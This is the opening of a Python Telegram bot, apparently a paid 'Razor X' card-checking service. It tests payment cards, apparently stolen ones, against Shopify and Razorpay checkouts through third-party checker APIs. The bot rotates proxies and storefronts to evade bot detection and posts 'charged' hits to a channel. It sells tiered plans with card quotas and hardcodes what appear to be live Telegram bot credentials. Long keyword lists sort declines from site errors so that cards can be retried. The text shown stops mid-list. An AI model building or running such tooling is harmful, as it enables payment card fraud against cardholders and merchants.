# bot.py - Full fixed RazorPay API, rest unchanged

# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽𝙤𝙝
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List
from telethon.errors import (
    UserNotParticipantError,
    ChatAdminRequiredError,
    ChannelPrivateError,
)

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, get_user_sites_with_info, remove_site_db,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark,
    generate_plan_code, redeem_plan_code, is_valid_code, get_code_info, remove_code,
    get_all_active_codes, get_all_codes
)

# ====================== LOGGING ======================
log = logging.getLogger("RazorX")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('razor_x_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except:
    pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS CONVERTER ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"

for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID", "26038836"))
API_HASH = os.getenv("API_HASH", "25f462e2a8517df5014a653c39cc58ca")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8743588011:AAFKa-DmECawpthbzWwyRaSexdmP7CQvgIA")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[7935621079]"))

# ✅ UPDATED SHOPIFY API URL
API_BASE_URL = os.getenv("API_BASE_URL", "https://haters.cxchk.site/shopii")
# ✅ UPDATED RAZORPAY API URL
RAZORPAY_API_URL = os.getenv("RAZORPAY_API_URL", "https://ravenxkiller.site/rz/r.php")

HIT_CHANNEL_ID = -1003706085466
JOIN_GROUP_ID = -1003706085466
JOIN_CHANNEL_ID = -1002769254935
JOIN_GROUP_LINK = "https://t.me/+GoD4hjCqsMo4MWY0"
JOIN_CHANNEL_LINK = "https://t.me/freecheckout2026"

# ── SEPARATE Worker Configuration (PER-USER) ──
SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

# ── Timeout Configuration ──
API_TIMEOUT = 60
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
RZ_TIMEOUT = 60

# ── General Settings ──
BATCH_SIZE = 60
SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = HIT_CHANNEL_ID

FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10

PLANS = {
    "trial": {"name": bs("Trial Access"), "tier": "Trial", "duration_days": 2, "emoji": "🎁", "price": "$0.00", "cc_limit": 500},
    "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00", "cc_limit": 1500},
    "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00", "cc_limit": 2500},
    "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00", "cc_limit": 5000},
    "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00", "cc_limit": 10000},
}
PAID_TIERS = ["Trial", "Core", "Elite", "Root", "X"]

# ── PER-USER Semaphore Factory ──
_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)


def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]


def cleanup_user_sem(uid):
    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
    for k in keys_to_remove:
        del _USER_SEMS[k]


CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}

BOT_START_TIME = time.time()

HIT_BUTTON = [[Button.url(bs("Razor X"), "https://t.me/BoobsshopifyBot")]]

# ── SEPARATE PER-USER HTTP Session Pools ──
_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None


async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else API_TIMEOUT
        connector = aiohttp.TCPConnector(
            limit=150,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout_val, connect=10),
            connector=connector,
        )
        _USER_HTTP_SESSIONS[key] = session
    return session


async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except:
            pass


async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_BIN_SESSION


async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_PROXY_SESSION


# ====================== FREE USER DAILY TRACKER ======================
def _get_today_key():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]


def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1


def get_free_sp_cooldown_remaining(user_id):
    last = _FREE_SP_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_SP_COOLDOWN:
        return 0
    return round(FREE_SP_COOLDOWN - elapsed, 1)


def set_free_sp_last_use(user_id):
    _FREE_SP_LAST_USE[user_id] = time.time()


# ====================== SMART ROTATION ENGINE ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            available = [s for s in sites if s not in exclude]
        if not available:
            available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available:
            available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available:
            available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]

    def report_site_ok(self, site):
        self._site_fails[site] = 0

    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1

    def report_proxy_ok(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = 0

    def report_proxy_fail(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1

    def get_site_fails(self, site):
        return self._site_fails.get(site, 0)

    def get_dead_sites(self, threshold=5):
        return {s for s, c in self._site_fails.items() if c >= threshold}


# ====================== COMPLETE SITE ERROR DETECTION (UPDATED) ======================
SITE_ERROR_KEYWORDS = [
    # === AAPKE PHOTO WALE ERRORS ===
    'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
    'merchandise_product_not_published_in_buyer_location',
    'WAITING_PENDING_TERMS',
    'waiting_pending_terms',
    'InventoryReservationFailure',
    'inventoryreservationfailure',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'delivery_delivery_line_detail_changed',
    'MERCHANDISE_PRODUCT_NOT_PUBLIC',
    'merchandise_product_not_public',
    'PAYMENTS_INVALID_GATEWAY_FOR_I',
    'payments_invalid_gateway_for_i',
    'PAYMENTS_INVALID_GATEWAY',
    'payments_invalid_gateway',
    'MERCHANDISE_NOT_ENOUGH_STOCK',
    'merchandise_not_enough_stock',
    
    # === NEW SHOPIFY ERRORS ===
    'MERCHANDISE_LINE_ITEM_NOT_PURCHASABLE',
    'merchandise_line_item_not_purchasable',
    'CHECKOUT_CART_LINE_ITEM_LIMIT_REACHED',
    'checkout_cart_line_item_limit_reached',
    'PAYMENTS_CREDIT_CARD_BASE_BIN',
    'PAYMENTS_CREDIT_CARD_BASE_BRAND_NOT_SUPPORTED',
    'payments_credit_card_base_brand_not_supported',
    'SHIPPING_LINE_REQUIRED',
    'shipping_line_required',
    'INVALID_CART_ATTRIBUTE',
    'invalid_cart_attribute',
    'DISCOUNT_CODE_NOT_FOUND',
    'discount_code_not_found',
    'DISCOUNT_CODE_ALREADY_APPLIED',
    'discount_code_already_applied',
    'GIFT_CARD_NOT_FOUND',
    'gift_card_not_found',
    'CUSTOMER_DISABLED',
    'customer_disabled',
    'SHOP_POLICY_VIOLATION',
    'shop_policy_violation',
    'ORDER_MINIMUM_NOT_MET',
    'order_minimum_not_met',
    'ORDER_MAXIMUM_EXCEEDED',
    'order_maximum_exceeded',
    'PRODUCT_NOT_AVAILABLE_IN_QUANTITY',
    'product_not_available_in_quantity',
    'INVALID_SHIPPING_ADDRESS',
    'invalid_shipping_address',
    'INVALID_BILLING_ADDRESS',
    'invalid_billing_address',
    'TAX_CALCULATION_FAILED',
    'tax_calculation_failed',
    'CURRENCY_NOT_SUPPORTED',
    'currency_not_supported',
    'SHOPIFY_CHECKOUT_PROTECTION',
    'shopify_checkout_protection',
    'BOT_DETECTED',
    'bot_detected',
    'RATE_LIMITED',
    'rate_limited',
    
    # === NEW ERRORS FROM USER ===
    'Error Processing Card: 503',
    'Service Unava',
    'DECISION_RULE_BLOCK',
    'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
    'policy_class',
    'INVALID_PAYMENT_METHOD',
    'MERCHANDISE_OUT_OF_STOCK',
    'VALIDATION_CUSTOM',
    'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
    'Empty submit response',
    'No valid payment method found',
    
    # === ORIGINAL KEYWORDS ===
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found', 'checkout token not found',
    'no checkout token', 'checkout token is empty', 'tokenize_fail', 'tokenize fail',
    'tax ammount empty', 'tax amount empty', 'tax amount is empty',
    'del ammount empty', 'site not supported for now', 'payment base card not supported',
    'no product found', 'checkout is not available', 'cart is empty', 'cart add failed after retries',
    'checkout_expired', 'checkout_not_found', 'no shipping methods available',
    'payment method not available', 'Payment method not available',
    'no valid payment method found', 'No valid payment method found',
    'payment method not found', 'payment method unavailable',
    'payment method not supported', 'no payment methods available',
    'delivery_no_delivery_strategy', 'DELIVERY_NO_DELIVERY_STRATEGY',
    'delivery_strategy_conditions', 'DELIVERY_STRATEGY_CONDITIONS',
    'delivery_strategy_conditions_1', 'DELIVERY_STRATEGY_CONDITIONS_1',
    'no shipping methods available', 'delivery not available',
    'delivery_company_required', 'DELIVERY_COMPANY_REQUIRED',
    'delivery_address_required', 'cannot ship to this address',
    'delivery_address2_required', 'delivery_line_detail_changed',
    'delivery_line', 'delivery_address', 'address_required',
    'submit_rejected', 'submit rejected:', 'shipping method not available',
    'DELIVERY_COMPANY_REQUEST', 'payments_credit_card_base_exp',
    'PAYMENTS_CREDIT_CARD_BASE_EXP', 'payments_credit_card_base_cvv',
    'PAYMENTS_CREDIT_CARD_BASE_CVV', 'payments_credit_card_base_number',
    'PAYMENTS_CREDIT_CARD_BASE_NUMBER', 'payments_positive_amount_expected',
    'PAYMENTS_POSITIVE_AMOUNT_EXPECTED', 'payments_payment_flexibility_token',
    'PAYMENTS_PAYMENT_FLEXIBILITY_TOKEN', 'buyer_identity_presentment_currency',
    'BUYER_IDENTITY_PRESENTMENT_CURRENCY', 'inventory_reservation_failure',
    'INVENTORY_RESERVATION_FAILURE', 'payments_positive_amount_expec',
    'payments_payment_flexibility_t', 'payments_credit_card_brand_not',
    'checkout is disabled', 'checkout not available for this store', 'checkout is locked',
    'checkout limit reached', 'checkout is not active', 'cart could not be created',
    'checkout token expired', 'checkout session expired', 'checkout is already completed',
    'checkout is already paid', 'shopify checkouts are unavailable',
    'checkout not found', 'checkout expired', 'checkout token empty',
    'failed to get checkout url', 'checkout creation failed',
    'checkout id is empty', 'checkout is null',
    'shop is currently unavailable', 'store is currently unavailable',
    'this shop is currently unavailable', 'this store is currently unavailable',
    'shop is unavailable', 'store is unavailable', 'shop closed', 'store closed',
    'this store is private', 'store not found', 'page not found',
    'store is password protected', 'enter store using password',
    'storefront is password protected', 'password protected',
    'closed for maintenance', 'under maintenance',
    'site error! status: 400', 'site error! status: 401', 'site error! status: 403',
    'site error! status: 404', 'site error! status: 408', 'site error! status: 429',
    'site error! status: 500', 'site error! status: 501', 'site error! status: 502', 
    'site error! status: 503', 'site error! status: 504', 'site error! status: 505',
    'site error! status: 520', 'site error! status: 521', 'site error! status: 522',
    'site error! status: 523', 'site error! status: 524', 'site error! status: 525',
    'site error! status: 526', 'site error! status: 527', 'site error! status: 530',
    'http 400', 'http 401', 'http 403', 'http 404', 'http 408', 'http 429',
    'http 500', 'http 502', 'http 503', 'http 504', 'http 520', 'http 521',
    'http 522', 'http 523', 'http 524', 'http 525', 'bad gateway',
    'service unavailable', 'gateway timeout', 'internal server error',
    'connection refused', 'connection closed', 'connection reset by peer',
    'connection aborted', 'connection timeout', 'connection timed out',
    'network is unreachable', 'host is unreachable', 'no route to host',
    'connection error', 'connection failed', 'timed out', 'timeout',
    'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout',
    'http error', 'httperror', 'httperror504', 'httperror502', 'httperror503',
    'cannot connect to host', 'failed to establish connection',
    'connection pool error', 'max retries exceeded with url',
    'ssl certificate error', 'ssl handshake failed', 'ssl error',
    'tls connection failed', 'certificate verify failed',
    'self signed certificate', 'expired certificate',
    'remote host closed connection', 'broken pipe',
    'ssl: certificate_verify_failed', 'tlsv1 unrecognized name',
    'wrong version number', 'decryption failed', 'bad record mac',
    'dns lookup failed', 'dns resolution failed', 'dns error',
    'cannot resolve host', 'hostname not found', 'no address associated',
    'name resolution failed', 'getaddrinfo failed', 'dns server not responding',
    'dns query failed', 'temporary failure in name resolution',
    'rate limit exceeded', 'too many requests', 'request was throttled',
    'detected unusual activity', 'automated request detected',
    'bot protection enabled', 'access denied due to bot activity',
    'blocked by robots.txt', 'challenge required', 'hcaptcha detected',
    'hcaptcha_detected', 'captcha at checkout', 'captcha_required',
    'captcha required', 'cloudflare', 'access denied', 'permission denied',
    'access forbidden', 'forbidden access', 'blocked by cloudflare',
    'ddos protection', 'browser check', 'checking your browser',
    'just a moment', 'ray id:', 'cf-ray:', 'cf-chl-bypass',
    'unexpected end of json', 'json decode error', 'json parse error',
    'cannot unmarshal', 'malformed response', 'invalid character',
    'invalid json response', 'invalid json', 'json.decoder.jsondecodeerror',
    'expecting value', 'extra data', 'unterminated string',
    'site error', 'site dead', 'site errors', 'server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source',
    'change proxy or site', 'change site', 'fake charge gate', 'fake gate',
    'amount_too_small', 'amount too small',
    'product out of stock', 'malformed input', 'url rejected',
    'invalid_response', 'cart failed with status',
    'cookie disabled', 'session cookie not found', 'session creation failed',
    'no valid session', 'session not found', 'session expired', 'session invalid',
    'failed to get session', 'session token missing', 'invalid session',
    'redirect loop detected', 'too many redirects', 'redirection error',
    'max redirects exceeded', 'infinite redirect',
    "'products'", "error:", "error: '", 'cart add failed', 'cart is empty',
    "'errors'", '"errors"', '{"errors":', 'errors":{',
    'unauthenticated', 'unauthorized', 'invalid api key',
    'access token invalid', 'throttled', 'shop is frozen',
    'store is frozen', 'shop has been frozen',
    'api limit exceeded', 'quota exceeded', 'usage limit reached',
    'request too large', 'payload too large', 'entity too large',
    'failed after retries', 'max retries exceeded', 'retry limit exceeded',
    'temporary failure', 'try again later', 'please try again',
    'internal error', 'system error', 'fatal error', 'critical error',
    'ARTIFACT_DISSATISFACTION', 'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR', 'processing_error', 'DECISION_RULE_BLOCK',
    'decision_rule_block',
    'unable to get payment token', 'empty submit response', 'empty submit',
    'order_total_changed', 'order total changed', 'invalid_payment_method',
    'invalid payment method', 'validation_custom', 'validation custom',
    'payment provider error', 'payment gateway error', 'payment processor error',
    'error processing card', 'we could not process', 'unable to process',
]
PROXY_ERROR_KEYWORDS = [
    'proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed',
    'proxy refused', 'proxy authentication failed', 'proxy unauthorized',
    'proxy connection refused', 'proxy dns error', 'proxy ssl error',
    'socks5 error', 'socks4 error', 'http proxy error', 'https proxy error',
    'proxy server unreachable', 'proxy connection timeout',
    'proxy handshake failed', 'proxy protocol error', 'invalid proxy',
    'proxy requires authentication', '407 proxy authentication required',
    'proxy connection reset', 'proxy connection closed',
    'tunnel connection failed', 'proxy tunnel failed', 'cant connect to proxy',
    'proxy host unreachable', 'proxy port unreachable', 'proxy refused connection',
]

RZ_RETRY_KEYWORDS = [
    'payment id not found', 'payment_id_not_found', 'payment not found',
    'timeout', 'timed out', 'connection error', 'connection failed',
    'connection reset', 'server error', 'internal server error',
    '502', '503', '504', '500', 'bad gateway', 'service unavailable',
    'gateway timeout', 'empty reply', 'invalid json', 'could not resolve host',
    'network error', 'ssl routines', 'unreachable', 'proxy dead',
    'proxy error', 'proxy timeout', 'DEAD | Payment ID not found',
    'rate limited', 'too many requests', '429', 'retry after',
    'temporary error', 'try again', 'please retry', 'server busy',
    'overloaded', 'downstream error', 'upstream error', 'gateway error',
    'connection pool timeout', 'request timeout', 'read timeout',
    'write timeout', 'connect timeout', 'dns error', 'no route to host',
]

# Card-level retry keywords (errors that should trigger same-card retry)
CARD_RETRY_KEYWORDS = [
    'timeout', 'timed out', 'connection error', 'connection failed',
    'connection reset', 'server error', 'internal server error',
    '502', '503', '504', '500', 'bad gateway', 'service unavailable',
    'gateway timeout', 'empty reply', 'invalid json',
    'network error', 'unreachable', 'rate limited', 'too many requests',
    '429', 'retry after', 'temporary failure', 'try again later',
    'please try again', 'server busy', 'overloaded', 'downstream error',
    'upstream error', 'gateway error', 'request timeout', 'read timeout',
    'write timeout', 'connect timeout', 'dns error', 'could not resolve host',
    'Error Processing Card', 'Service Unava', 'DECISION_RULE_BLOCK',
    'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH', 'policy_class',
    'INVALID_PAYMENT_METHOD', 'MERCHANDISE_OUT_OF_STOCK', 'VALIDATION_CUSTOM',
    'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH', 'Empty submit response',
    'No valid payment method found', 'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
]


def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    if lower == 'na':
        return True
    
    payment_errors = [
        'payment method not available', 'no valid payment method found',
        'payment method not found', 'payment method unavailable',
        'delivery_strategy_conditions', 'delivery_no_delivery_strategy',
        'payments_credit_card_base', 'checkout not available',
        'delivery_company_required', 'delivery_strategy_conditions_1'
    ]
    for pe in payment_errors:
        if pe in lower:
            return True
    
    return any(kw.lower() in lower for kw in SITE_ERROR_KEYWORDS)


def is_card_retry_needed(response_text):
    """Check if the card should be retried (temporary error, not permanent decline)"""
    if not response_text:
        return True
    lower = response_text.lower().strip()
    
    # These are permanent declines - no retry
    permanent_declines = [
        'card_declined', 'card declined', 'generic_decline', 'generic decline',
        'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
        'stolen_card', 'stolen card', 'lost_card', 'lost card', 'expired_card',
        'expired card', 'restricted_card', 'restricted card', 'fraudulent',
        'transaction_not_allowed', 'not permitted', 'card_not_supported',
        'card not supported', 'duplicate_transaction', 'pickup_card',
        'revocation_of_authorization', 'no_action_taken', 'avs_check_failed',
        'incorrect number', 'incorrect_number', 'invalid_number'
    ]
    
    for pd in permanent_declines:
        if pd in lower:
            return False
    
    # Check if it's a retry-able error
    return any(kw.lower() in lower for kw in CARD_RETRY_KEYWORDS)


def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)


def is_rz_retry_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in RZ_RETRY_KEYWORDS)


def is_site_truly_dead(response, price):
    if not response:
        return True
    
    response_upper = response.upper().strip()
    
    exact_dead = [
        'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
        'WAITING_PENDING_TERMS',
        'INVENTORYRESERVATIONFAILURE',
        'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
        'MERCHANDISE_LINE_ITEM_NOT_PURCHASABLE',
        'CHECKOUT_CART_LINE_ITEM_LIMIT_REACHED',
        'PAYMENTS_CREDIT_CARD_BASE_BIN',
        'PAYMENTS_CREDIT_CARD_BASE_BRAND_NOT_SUPPORTED',
        'SHIPPING_LINE_REQUIRED',
        'INVALID_CART_ATTRIBUTE',
        'DISCOUNT_CODE_NOT_FOUND',
        'DISCOUNT_CODE_ALREADY_APPLIED',
        'GIFT_CARD_NOT_FOUND',
        'CUSTOMER_DISABLED',
        'SHOP_POLICY_VIOLATION',
        'ORDER_MINIMUM_NOT_MET',
        'ORDER_MAXIMUM_EXCEEDED',
        'PRODUCT_NOT_AVAILABLE_IN_QUANTITY',
        'INVALID_SHIPPING_ADDRESS',
        'INVALID_BILLING_ADDRESS',
        'TAX_CALCULATION_FAILED',
        'CURRENCY_NOT_SUPPORTED',
        'SHOPIFY_CHECKOUT_PROTECTION',
        'BOT_DETECTED',
        'RATE_LIMITED',
        'MERCHANDISE_PRODUCT_NOT_PUBLIC',
        'PAYMENTS_INVALID_GATEWAY_FOR_I',
        'PAYMENTS_INVALID_GATEWAY',
        'CHECKOUT_NOT_FOUND',
        'PAGE_NOT_FOUND',
        'STORE_NOT_FOUND',
        'PRODUCT_NOT_FOUND',
        'NO_PRODUCT_FOUND',
        'CART_IS_EMPTY',
        'CHECKOUT_DISABLED',
        'MERCHANDISE_NOT_ENOUGH_STOCK',
        'DECISION_RULE_BLOCK',
        'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
        'INVALID_PAYMENT_METHOD',
        'MERCHANDISE_OUT_OF_STOCK',
        'VALIDATION_CUSTOM',
        'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
    ]
    
    for dead in exact_dead:
        if dead in response_upper:
            return True
    
    lower = response.lower()
    
    dead_indicators = [
        'merchandise_product_not_public',
        'payments_invalid_gateway',
        'payments_invalid_gateway_for_i',
        'merchandise_not_enough_stock',
        'payments_credit_card_base_exp',
        'payments_credit_card_base_cvv',
        'payments_credit_card_base_number',
        'payments_positive_amount_expected',
        'payments_payment_flexibility_token',
        'buyer_identity_presentment_currency',
        'inventory_reservation_failure',
        'inventoryreservationfailure',
        'payment method not available',
        'no valid payment method found',
        'payment method not found',
        'payment method unavailable',
        'payment method not supported',
        'no payment methods available',
        'checkout is disabled',
        'checkout not available',
        'checkout not available for this store',
        'checkout is locked',
        'checkout limit reached',
        'checkout is not active',
        'checkout not found',
        'checkout expired',
        'checkout token empty',
        'checkout token not found',
        'checkout token is empty',
        'checkout is already completed',
        'checkout is already paid',
        'checkout creation failed',
        'checkout id is empty',
        'checkout is null',
        'cart is empty',
        'cart could not be created',
        'cart add failed after retries',
        'cart add failed',
        'no product found',
        'product out of stock',
        'product not found',
        'no valid products',
        'product id is empty',
        'r2 id empty',
        'py id empty',
        'failed to get token',
        'token not found',
        'no_session_token',
        'no session token',
        'no checkout token found',
        'failed to get session token',
        'failed to tokenize card',
        'tokenize_fail',
        'tokenize fail',
        'r4 token empty',
        'clinte token',
        'store is currently unavailable',
        'this store is currently unavailable',
        'store is unavailable',
        'shop is currently unavailable',
        'this shop is currently unavailable',
        'shop is unavailable',
        'shop closed',
        'store closed',
        'this store is private',
        'store not found',
        'page not found',
        'store is password protected',
        'enter store using password',
        'storefront is password protected',
        'password protected',
